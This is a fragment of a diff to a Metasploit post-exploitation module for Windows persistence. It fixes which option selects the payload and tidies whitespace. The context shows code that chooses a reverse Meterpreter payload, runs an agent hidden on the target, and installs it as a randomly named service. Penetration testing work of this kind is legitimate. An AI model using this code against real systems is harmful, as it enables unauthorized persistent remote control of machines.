@@ -60,7 +60,6 @@ class Metasploit3 < Msf::Post
 				OptString.new('TEMPLATE', [false, 'Alternate template Windows PE File to use.']),
 				OptString.new('REXE',[false, 'The remote executable to use.','']),
 				OptString.new('REXENAME',[false, 'The name to call exe on remote system','']),
-				OptString.new('ACTION',[true, 'Use TEMPLATE or REXE mode.','TEMPLATE']),
 				OptEnum.new('PAYLOAD_TYPE', [true, 'Meterpreter Payload Type.', 'TCP',['TCP','HTTP','HTTPS']])
 			], self.class)
 
@@ -102,7 +101,7 @@ class Metasploit3 < Msf::Post
 			end
 
 			# Set the proper payload
-			case datastore['STARTUP']
+			case datastore['PAYLOAD_TYPE']
 			when /TCP/i
 				payload = "windows/meterpreter/reverse_tcp"
 			when /HTTP/i
@@ -325,7 +324,7 @@ class Metasploit3 < Msf::Post
 	def target_exec(script_on_target)
 		print_status("Executing script #{script_on_target}")
 		proc = datastore['ACTION'] == 'REXE' ? session.sys.process.execute(script_on_target, nil, {'Hidden' => true})\
-		: session.sys.process.execute("cscript \"#{script_on_target}\"", nil, {'Hidden' => true})		
+		: session.sys.process.execute("cscript \"#{script_on_target}\"", nil, {'Hidden' => true})
 
 		print_good("Agent executed with PID #{proc.pid}")
 		@clean_up_rc << "kill #{proc.pid}\n"
@@ -347,7 +346,7 @@ class Metasploit3 < Msf::Post
 	# Function to install payload as a service
 	#-------------------------------------------------------------------------------
 	def install_as_service(script_on_target)
-		if  is_system? or is_admin?  
+		if  is_system? or is_admin?
 			print_status("Installing as service..")
 			nam = Rex::Text.rand_text_alpha(rand(8)+8)
 			print_status("Creating service #{nam}")
